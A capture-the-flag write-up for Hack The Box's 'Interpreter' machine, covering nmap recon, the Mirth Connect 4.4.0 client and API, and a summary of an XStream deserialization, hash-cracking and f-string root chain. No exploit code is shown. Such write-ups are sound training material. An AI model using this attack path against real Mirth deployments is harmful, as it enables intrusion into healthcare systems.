[HTB: Interpreter](/2026/05/30/htb-interpreter.html)

![Interpreter](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/interpreter-cover.webp)

Interpreter is a Linux box hosting Mirth Connect, a Java-based healthcare integration engine. I’ll exploit an unauthenticated XStream deserialization vulnerability in the Mirth API to get remote code execution and a foothold as the mirth service account. From the Mirth config I’ll grab database credentials, dump a user password hash from MariaDB, and crack it to pivot to the next user. For root, I’ll abuse a localhost Flask notification server that wraps XML-supplied fields in an evaluated f-string, allowing Python code execution as root.

## Box Info

[![Interpreter](/icons/box-interpreter.webp)](https://hackthebox.com/machines/interpreter)

[Interpreter](https://hackthebox.com/machines/interpreter)

Medium

Retire Date 30 May 2026

OS ![Linux](/icons/Linux.webp)

Rated Difficulty ![Rated difficulty for Interpreter](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/interpreter-diff.webp)

Radar Graph ![Radar chart for Interpreter](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/interpreter-radar.webp)

User

00:19:23 Root

00:19:48 Creator ## Recon

### Initial Scanning

`nmap` finds four open TCP ports, SSH (22), HTTP (80), HTTPS (443), and something unknown (6661):

```
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.244.184
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-21 20:30 UTC
Nmap scan report for 10.129.244.184
Host is up, received reset ttl 63 (0.020s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
443/tcp  open  https   syn-ack ttl 63
6661/tcp open  unknown syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
oxdf@hacky$ sudo nmap -p 22,80,443,6661 -sCV 10.129.244.184
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-21 20:30 UTC
Nmap scan report for 10.129.244.184
Host is up (0.020s latency).

PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp   open  http
|_http-title: Mirth Connect Administrator
| http-methods:
|_  Potentially risky methods: TRACE
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 458
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 404 Not Found</title>
|     </head>
|     <body><h2>HTTP ERROR 404 Not Found</h2>
|     <table>
|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
|     <tr><th>STATUS:</th><td>404</td></tr>
|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-3d7dbe10</td></tr>
|     </table>
|     </body>
|     </html>
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Thu, 21 May 2026 20:30:29 GMT
|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 2532
|     <!doctype html>
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <meta http-equiv="x-ua-compatible" content="IE=edge">
|     <meta http-equiv="cache-control" content="no-cache">
|     <meta http-equiv="cache-control" content="no-store">
|     <title>Mirth Connect Administrator</title>
|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
|     <link rel="stylesheet" type="text/css" href="css/main.css" />
|     <script type="text/javascript">
|     Break out of frame if inside a frame. */
|     (window != window.top) {
|     window.top.location = window.location;
|     </script>
|     <script type="text/javascript" sr
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Thu, 21 May 2026 20:30:29 GMT
|     Allow: GET, HEAD, TRACE, OPTIONS
|   RTSPRequest:
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   X11Probe:
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
443/tcp  open  ssl/https
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 458
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 404 Not Found</title>
|     </head>
|     <body><h2>HTTP ERROR 404 Not Found</h2>
|     <table>
|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
|     <tr><th>STATUS:</th><td>404</td></tr>
|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-3d7dbe10</td></tr>
|     </table>
|     </body>
|     </html>
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Thu, 21 May 2026 20:30:36 GMT
|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 2532
|     <!doctype html>
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <meta http-equiv="x-ua-compatible" content="IE=edge">
|     <meta http-equiv="cache-control" content="no-cache">
|     <meta http-equiv="cache-control" content="no-store">
|     <title>Mirth Connect Administrator</title>
|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
|     <link rel="stylesheet" type="text/css" href="css/main.css" />
|     <script type="text/javascript">
|     Break out of frame if inside a frame. */
|     (window != window.top) {
|     window.top.location = window.location;
|     </script>
|     <script type="text/javascript" sr
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Thu, 21 May 2026 20:30:37 GMT
|_    Allow: GET, HEAD, TRACE, OPTIONS
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
6661/tcp open  unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=5/21%Time=6A0F6B70%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A8F,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2021\x20May\x20
SF:2026\x2020:30:29\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x202023\
SF:x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
SF:ytes\r\nContent-Length:\x202532\r\n\r\n<!doctype\x20html>\n<html>\n<hea
SF:d>\n\t<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20c
SF:harset=UTF-8\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\
SF:"IE=edge\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-ca
SF:che\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-store\"
SF:>\n\t\n\t<title>Mirth\x20Connect\x20Administrator</title>\n\t\n\t<link\
SF:x20rel=\"shortcut\x20icon\"\x20type=\"image/x-icon\"\x20href=\"images/N
SF:G_MC_Icon_16x16\.png\"\x20/>\n\t<link\x20rel=\"stylesheet\"\x20type=\"t
SF:ext/css\"\x20href=\"css/bootstrap\.css\"\x20/>\n\t<link\x20rel=\"styles
SF:heet\"\x20type=\"text/css\"\x20href=\"css/main\.css\"\x20/>\n\t\n\t<scr
SF:ipt\x20type=\"text/javascript\">\n\t\t/\*\x20Break\x20out\x20of\x20fram
SF:e\x20if\x20inside\x20a\x20frame\.\x20\*/\n\t\tif\x20\(window\x20!=\x20w
SF:indow\.top\)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.location
SF:;\n\t\t}\n\t</script>\n\n\t<script\x20type=\"text/javascript\"\x20sr")%
SF:r(HTTPOptions,5A,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2021\x20May\
SF:x202026\x2020:30:29\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\x20OPTI
SF:ONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\
SF:r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20
SF:58\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>re
SF:ason:\x20Unknown\x20Version</pre>")%r(X11Probe,C3,"HTTP/1\.1\x20400\x20
SF:Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=
SF:iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>
SF:Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=
SF:0x0</pre>")%r(FourOhFourRequest,257,"HTTP/1\.1\x20404\x20Not\x20Found\r
SF:\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nContent-Type:\
SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\r\n<html>
SF:\n<head>\n<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;c
SF:harset=ISO-8859-1\"/>\n<title>Error\x20404\x20Not\x20Found</title>\n</h
SF:ead>\n<body><h2>HTTP\x20ERROR\x20404\x20Not\x20Found</h2>\n<table>\n<tr
SF:><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity\.txt%2ebak</td></tr>\n<tr>
SF:<th>STATUS:</th><td>404</td></tr>\n<tr><th>MESSAGE:</th><td>Not\x20Foun
SF:d</td></tr>\n<tr><th>SERVLET:</th><td>org\.eclipse\.jetty\.servlet\.Ser
SF:vletHandler\$Default404Servlet-3d7dbe10</td></tr>\n</table>\n\n</body>\
SF:n</html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port443-TCP:V=7.94SVN%T=SSL%I=7%D=5/21%Time=6A0F6B78%P=x86_64-pc-linux-
SF:gnu%r(GetRequest,A8F,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2021\x20
SF:May\x202026\x2020:30:36\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x
SF:202023\x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Range
SF:s:\x20bytes\r\nContent-Length:\x202532\r\n\r\n<!doctype\x20html>\n<html
SF:>\n<head>\n\t<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/htm
SF:l;\x20charset=UTF-8\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20co
SF:ntent=\"IE=edge\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=
SF:\"no-cache\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-
SF:store\">\n\t\n\t<title>Mirth\x20Connect\x20Administrator</title>\n\t\n\
SF:t<link\x20rel=\"shortcut\x20icon\"\x20type=\"image/x-icon\"\x20href=\"i
SF:mages/NG_MC_Icon_16x16\.png\"\x20/>\n\t<link\x20rel=\"stylesheet\"\x20t
SF:ype=\"text/css\"\x20href=\"css/bootstrap\.css\"\x20/>\n\t<link\x20rel=\
SF:"stylesheet\"\x20type=\"text/css\"\x20href=\"css/main\.css\"\x20/>\n\t\
SF:n\t<script\x20type=\"text/javascript\">\n\t\t/\*\x20Break\x20out\x20of\
SF:x20frame\x20if\x20inside\x20a\x20frame\.\x20\*/\n\t\tif\x20\(window\x20
SF:!=\x20window\.top\)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.l
SF:ocation;\n\t\t}\n\t</script>\n\n\t<script\x20type=\"text/javascript\"\x
SF:20sr")%r(HTTPOptions,5A,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2021\
SF:x20May\x202026\x2020:30:37\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\
SF:x20OPTIONS\r\n\r\n")%r(FourOhFourRequest,257,"HTTP/1\.1\x20404\x20Not\x
SF:20Found\r\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nConte
SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\
SF:r\n<html>\n<head>\n<meta\x20http-equiv=\"Content-Type\"\x20content=\"te
SF:xt/html;charset=ISO-8859-1\"/>\n<title>Error\x20404\x20Not\x20Found</ti
SF:tle>\n</head>\n<body><h2>HTTP\x20ERROR\x20404\x20Not\x20Found</h2>\n<ta
SF:ble>\n<tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity\.txt%2ebak</td></
SF:tr>\n<tr><th>STATUS:</th><td>404</td></tr>\n<tr><th>MESSAGE:</th><td>No
SF:t\x20Found</td></tr>\n<tr><th>SERVLET:</th><td>org\.eclipse\.jetty\.ser
SF:vlet\.ServletHandler\$Default404Servlet-3d7dbe10</td></tr>\n</table>\n\
SF:n</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 205.76 seconds
```

Based on the [OpenSSH version](about:/cheatsheets/os#debian), the host is likely running Debian 12 Bookworm (from 2023).

All of the ports show a TTL of 63, which matches the [expected TTL](about:/cheatsheets/os#os-identification) for Linux one hop away.

There’s a string in both of the web port scans that contains “jetty”, suggesting this may be a Java webserver.

### Website - TCP 80 / 443

#### Site

The site offers a login page for Mirth Connect by NextGen Healthcare:

![image-20260521173736782](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260521173736782.webp)

The only difference on HTTP is that it doesn’t let you log in, instead offering a link to the HTTPS URL:

![image-20260521171935258](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260521171935258.webp)

I don’t have any creds and no simple guesses work:

![image-20260522065804409](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260522065804409.webp)

The “Launch Mirth Connect Administrator” link downloads a `webstart.jnlp` file. “Download Administrator Launcher” is a shell script, `mirth-administrator-launcher-latest-unix.sh`.

[Mirth Connect by NextGen Healthcare](https://github.com/nextgenhealthcare/connect) is real open-source software. It’s a Java-based healthcare integration engine. It receives, filters, transforms, and routes messages between healthcare systems using configurable “channels”. It’s primarily built around Health Level Seven (HL7) data but also handles DICOM, X12/EDI, XML, and JSON. Channel filters and transformers are written in JavaScript and run through an embedded Rhino interpreter.

The `.jnlp` and `.sh` files are both ways to set up the Administrator thick client that connects to the server. A web interface also exists, the Web Dashboard, but it only shows channel and message monitoring stats. All real configuration happens in the thick client.

#### Client

It’s not necessary to solve the box, but to understand the intended behavior, I can install the client using the `.sh` script. It’s actually an interesting script.

It’s named like a shell script and starts like one, but the body is mostly binary, and the file is huge:

```
oxdf@hacky$ file mirth-administrator-launcher-latest-unix.sh 
mirth-administrator-launcher-latest-unix.sh: POSIX shell script executable (binary data)
oxdf@hacky$ ls -lh mirth-administrator-launcher-latest-unix.sh 
-rwxrwx--- 1 root vboxsf 226M Sep 23  2024 mirth-administrator-launcher-latest-unix.sh
```

226 MB of “shell script”. The first few hundred lines are real POSIX shell that hunts down a usable JRE on the host. After that, at line 671, the script becomes a bunch of binary data:

![image-20260527191110358](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260527191110358.webp)

At line 475, it shows how this is used:

```bash
tail -c 87626702 "$prg_dir/${progname}" > sfx_archive.tar.gz 2> /dev/null
```

`tail -c 87626702` grabs the last ~84 MB of the file by byte count. I’ll do that myself:

```
oxdf@hacky$ tail -c 87626702 mirth-administrator-launcher-latest-unix.sh > sfx_archive.tar.gz
oxdf@hacky$ file sfx_archive.tar.gz 
sfx_archive.tar.gz: gzip compressed data, original size modulo 2^32 90065408
```

It’s a `.tar.gz` archive:

```
oxdf@hacky$ gunzip sfx_archive.tar.gz 
oxdf@hacky$ file sfx_archive.tar 
sfx_archive.tar: POSIX tar archive
oxdf@hacky$ tar tf sfx_archive.tar
i4jparams.conf
i4jempty.ttf
i4j_extf_10_1fr4isd_18gg8kx@2x_dark.png
i4j_extf_5_1fr4isd_x7nby6.png
i4j_extf_12_1fr4isd_5pr459.png
libi4jinst.dylib
i4j_extf_6_1fr4isd_vd2dea.png
i4j_extf_2_1fr4isd.txt
i4j_extf_11_1fr4isd_1rpumog.png
i4j_extf_4_1fr4isd_rhc5ay.icns
launchers.xml
jre.tar.gz
i4j_extf_3_1fr4isd_gz8ncf.ico
i4j_extf_7_1fr4isd_un9apv.png
MessagesDefault
libi4jinst2.dylib
i4j_extf_8_1fr4isd_1xth8wx.png
i4j_extf_1_1fr4isd
i4j_extf_9_1fr4isd_259ij1.png
i4j_extf_10_1fr4isd_18gg8kx@2x.png
i4j_extf_10_1fr4isd_18gg8kx_dark.png
stats.properties
user.jar
i4j_extf_0_1fr4isd.utf8
user
user/flatlaf.jar
i4j_extf_10_1fr4isd_18gg8kx.png
i4jruntime.jar
launcher0.jar
launcher7b9c3515.jar
launcher4fd1c277.jar
launcher2bfa42ba.jar
```

The script gunzips the binary data, untars it into a temp directory, and the extracted tree contains a bundled JRE and a Java installer class that the shell then runs with `java`. This is the [install4j](https://www.ej-technologies.com/products/install4j/overview.html) self-extracting installer pattern, where one `.sh` is both the launcher and the entire payload.

When I run it as root, it pops up an installer:

![image-20260522074747135](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260522074747135.webp)

Stepping through the screens, it shows that it comes with a Java installation:

![image-20260522074830866](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260522074830866.webp)

Once it installed and opens, the initial screen is looking for connection information:

![image-20260522074935562](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260522074935562.webp)

I’ll enter `https://<interface ip>`, and it downloads some stuff, and pops a window looking for creds:

![image-20260522075059512](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260522075059512.webp)

#### API

At `/api`, there’s swagger-style documentation for the API:

 ![image-20260522100630683](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260522100630683.webp)![expand](/icons/expand.png)

Everything I try returns 401:

![image-20260522100746871](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260522100746871.webp)

I’ll need auth or a pre-auth exploit.

#### Tech Stack

The web application is clearly Java based, as is the client. The HTTP response headers don’t show anything interesting.

The 404 page is a [Jetty 404](about:/cheatsheets/404#jetty):

![image-20260522075509027](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260522075509027.webp)

This is the 404 page that Jetty serves when it reaches a servlet context but no servlet handles it (no added to the default 404s page).

I know this is also Mirth Connect, and the `.jnlp` file shows the version of 4.4.0:

```xml
<jnlp codebase="https://10.129.244.184:443" version="4.4.0">

    <information>

        <title>Mirth Connect Administrator 4.4.0</title>

        <vendor>NextGen Healthcare</vendor>

        <homepage href="http://www.nextgen.com"/>

        <description>Open Source Healthcare Integration Engine</description>

        <icon href="images/NG_MC_Icon_128x128.png"/>

        <icon href="images/MirthConnect_Logo_WordMark_Big.png" kind="splash"/>

        <offline-allowed/>

        <shortcut online="true">

            <!-- put a shortcut on the desktop -->

            <desktop/>

            <!-- put shortcut in start menu too -->

            <menu submenu="Mirth Connect"/>

        </shortcut>

    </information>

    <security>

        <all-permissions/>

    </security>

    <update check="timeout" policy="always"/>

    <resources>

        <j2se href="http://java.sun.com/products/autodl/j2se" java-vm-args="--add-modules=java.sql.rowset --add-exports=java.base/com.sun.crypto.provider=ALL-UNNAMED --add-exports=java.base/sun.security.provider=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED --add-opens=java.base/java.math=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.security=ALL-UNNAMED --add-opens=java.base/java.security.cert=ALL-UNNAMED --add-opens=java.base/java.text=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/sun.security.pkcs=ALL-UNNAMED --add-opens=java.base/sun.security.rsa=ALL-UNNAMED --add-opens=java.base/sun.security.x509=ALL-UNNAMED --add-opens=java.desktop/com.apple.eawt=ALL-UNNAMED --add-opens=java.desktop/com.apple.eio=ALL-UNNAMED --add-opens=java.desktop/java.awt=ALL-UNNAMED --add-opens=java.desktop/java.awt.color=ALL-UNNAMED --add-opens=java.desktop/java.awt.font=ALL-UNNAMED --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED" max-heap-size="512m" version="1.9+"/>

        <j2se href="http://java.sun.com/products/autodl/j2se" max-heap-size="512m" version="1.6+"/>

        <jar download="eager" href="webstart/client-lib/mirth-client.jar" main="true" sha256="IHeDHNaFglz/afA4Osr3nllnqCMpsgo6RmrVTjbKBsA="/>
        <jar download="eager" href="webstart/client-lib/mirth-client-core.jar" sha256="Ms8xCKJF4OPd0YHeM0I+dPyfKB4sdsXHcQsubFBfvz4="/>
        <jar download="eager" href="webstart/client-lib/mirth-crypto.jar" sha256="3QGDVXdCJU/pevR+R0wnBGKnI6Ffuigbt4xNw8IOJKM="/>
        <jar download="eager" href="webstart/client-lib/mirth-vocab.jar" sha256="C20/n2aTWZFxY4x8iEBcrLWGzz5taUMTlWLezAcpCRs="/>
        <jar download="eager" href="webstart/client-lib/commons-lang3-3.9.jar" sha256="Vgwgrwq6WiuqsbpFY2oAq3y8dYHTsrQXc7BT8d4Bjmg="/>
        <jar download="eager" href="webstart/client-lib/jackson-core-2.11.3.jar" sha256="Sn93THoyv2dXoxnx/FGS4YJgW0bWpBuzLPUo2S2fsWw="/>
        <jar download="eager" href="webstart/client-lib/language_support.jar" sha256="sAzNPDx8Zcc+miVKCivSPaJC3fSCwgPE7y/tWM6f48A="/>
        <jar download="eager" href="webstart/client-lib/donkey-model.jar" sha256="rUOeInGLuiIRKZpUgosD/5Jeitea+mMtVfy/WGS8B1Q="/>
        <jar download="eager" href="webstart/client-lib/commons-configuration2-2.7.jar" sha256="QcDVizhsNICZPRi4XT7K+hBgm9KNFdRPLetbna1te80="/>
        <jar download="eager" href="webstart/client-lib/commons-codec-1.13.jar" sha256="rqMdWtimh21sVB/oZf/qwut33nVpNeXVPm74vfuVmKY="/>
        <jar download="eager" href="webstart/client-lib/jetty-util-9.4.44.v20210927.jar" sha256="FwOCGovjairWKH7Rg7r1knTLOnid4R9I0M0EbsjNJ7s="/>
        <jar download="eager" href="webstart/client-lib/log4j-1.2-api-2.17.2.jar" sha256="4Gi6JmmLeoPW/o6DYZMFl8zZoyZIHZ//sPJP27A7AVY="/>
        <jar download="eager" href="webstart/client-lib/javax.annotation-api-1.3.jar" sha256="B9B2My7V8CSIJT6+VqrdC2qTKlHBi5VQtNEcFTDdiI8="/>
        <jar download="eager" href="webstart/client-lib/hk2-locator-2.4.0-b31.jar" sha256="OTY93Favv8bFowgge5fv/nizGE2Vhp7IATYrVwNs6wI="/>
        <jar download="eager" href="webstart/client-lib/velocity-tools-generic-3.0.jar" sha256="ItFZhaj2pSWqreMV0hiT2hpN9Es6wxznasfNlgwomEY="/>
        <jar download="eager" href="webstart/client-lib/mimepull-1.9.7.jar" sha256="IR3nxpVPJFHkB7rqiX14vBJbeg3kLStX30X9XiIgh98="/>
        <jar download="eager" href="webstart/client-lib/zip4j_1.3.3.jar" sha256="Nq0nH85RbGL9D3KOlo1UIciuuhJo75yL4CpSakYXRn0="/>
        <jar download="eager" href="webstart/client-lib/commons-io-2.6.jar" sha256="ETnAc6KUHMebRMv0FKWTlUF7Et8vHlMw3uagiYOQlag="/>
        <jar download="eager" href="webstart/client-lib/commons-collections4-4.4.jar" sha256="nW5g92kH9CucRW1+B3OI4oTvsICWwwd/7hkkbMFdIWc="/>
        <jar download="eager" href="webstart/client-lib/rsyntaxtextarea-2.5.6.jar" sha256="5AwU0m/gEfep5vsTDox3h+iFRielROm8Ee3aD6vTKTQ="/>
        <jar download="eager" href="webstart/client-lib/quartz-all-2.1.7.jar" sha256="s8iEI5/GpBxXvE6bF76gPuzeIsc6H/+6ybO7RIDPxGI="/>
        <jar download="eager" href="webstart/client-lib/commons-text-1.10.0.jar" sha256="mkbZGbj6rJ+DfxfzXg9K71+fjTzg5fKS4q+5hKE6FXY="/>
        <jar download="eager" href="webstart/client-lib/autocomplete-2.5.4.jar" sha256="e4ZfCl5M9ElresOdHO30kzKqv79SxvpW3hWyxsVEK3w="/>
        <jar download="eager" href="webstart/client-lib/utils-2.15.28.jar" sha256="F2h3NoUjlAcsMb7Tzr/1SnHQDE3jLNnk/94nym9ERV4="/>
        <jar download="eager" href="webstart/client-lib/xpp3-1.1.4c.jar" sha256="sRmgN+Q81MVgJ+0eJaPPWatm39tYtHFRx6XxgvtLkec="/>
        <jar download="eager" href="webstart/client-lib/libphonenumber-8.12.50.jar" sha256="tjWFlc1nGTCQKOUgi/w7sWHGmTpeoerafoRZeOM4Q5o="/>
        <jar download="eager" href="webstart/client-lib/log4j-core-2.17.2.jar" sha256="fylUDk4s8265Vk+Y/jvkLsW8x8e5VjJUjTS1v8VEkrs="/>
        <jar download="eager" href="webstart/client-lib/jersey-proxy-client-2.22.1.jar" sha256="kCMvyNtvYX9sgjMt5OnZ2gJ163vYkDhLYoV/xpUs3Co="/>
        <jar download="eager" href="webstart/client-lib/commons-vfs2-2.1.jar" sha256="AeG82Lit+p/45dInSR8cxRZ8Eb2LmIQelpPHRGEG3Fg="/>
        <jar download="eager" href="webstart/client-lib/commons-logging-1.2.jar" sha256="KBnbQ2TXK5shS9/peQgDFVll50w6kAMfBVzKVTgfMV4="/>
        <jar download="eager" href="webstart/client-lib/swagger-annotations-2.0.10.jar" sha256="obRzCEphaiLShGrWm3d1fEGpKaTwmsAN7RVwNpc4ybg="/>
        <jar download="eager" href="webstart/client-lib/xstream-1.4.19.jar" sha256="An1TfdUt/dyRZWO1O4L3OB8/I2JYJnHX/7u7e07lrfs="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v28-2.3.jar" sha256="LIlghnHInyIiHFipUqQEqo3w3/JHwBbVXKNhtH3vSpw="/>
        <jar download="eager" href="webstart/client-lib/looks-2.3.1.jar" sha256="YAGKqTQk1/doNoOzJ1me0F2OBO7bRAEa052xk2Y4Qxc="/>
        <jar download="eager" href="webstart/client-lib/jaxb-runtime-2.4.0-b180725.0644.jar" sha256="p+osvQhxLrgqF4woPOlD78SuhWAGS74O3nGOq2lsYt8="/>
        <jar download="eager" href="webstart/client-lib/jcifs-ng-2.1.8.jar" sha256="1LMOZ6bPn/yHjkrqho3k+KVvs0hCENbK4sh0lA7AefE="/>
        <jar download="eager" href="webstart/client-lib/swingx-core-1.6.2.jar" sha256="Krugs5yfMGY+hJP2YtVjQzk2fEBIDqKNL+Mpc0zs93E="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v23-2.3.jar" sha256="JlCBJVERFzAiyp4INZU5rdaQqHJRzlusNXYxwvVbNgA="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v21-2.3.jar" sha256="SWz11YnwDV8se0huhvnwPbSN3zb+52VnIXrCbxj71os="/>
        <jar download="eager" href="webstart/client-lib/bcutil-jdk18on-171.jar" sha256="/jd5If5JVbQraUTgVMUDOsziWVrAdupKbC2YtCaBEYU="/>
        <jar download="eager" href="webstart/client-lib/openjfx.jar" sha256="xXKQTb9rtpA+xbbrJv41SeGQsfBLK5od/tjYzSBEfqI="/>
        <jar download="eager" href="webstart/client-lib/hapi-base-2.3.jar" sha256="XgloOIjOa0PPHD6YRCtQYz8Sh1wOXd4qZwT8rP0NH2g="/>
        <jar download="eager" href="webstart/client-lib/jersey-media-multipart-2.22.1.jar" sha256="NI9cZ1099RlbB1UDeDeqxG+JDk1XL/5QpulQF76VM0E="/>
        <jar download="eager" href="webstart/client-lib/httpcore-4.4.13.jar" sha256="7GMATM3FXKnnKJokElaJxSUznUY4lI0nbKKo+XW/Amk="/>
        <jar download="eager" href="webstart/client-lib/xercesImpl-2.9.1.jar" sha256="35zfeAILzwjhdB7CmbVNu/IgqdWm92le919CD0vT3Go="/>
        <jar download="eager" href="webstart/client-lib/javax.activation-1.2.0.jar" sha256="rV9iEYBiiE0cU0+2Dd3Mqihmk/ykGK62+YGf/7Hmofo="/>
        <jar download="eager" href="webstart/client-lib/hk2-api-2.4.0-b31.jar" sha256="Yd0V2fCUvbtCeWsKybYe52IiKr0pcWUXYG2r1qRCKVo="/>
        <jar download="eager" href="webstart/client-lib/commons-compress-1.17.jar" sha256="vdHWwrCXRfPZawbulPFXxx/9elZghqPNsYD9Sq/EiRU="/>
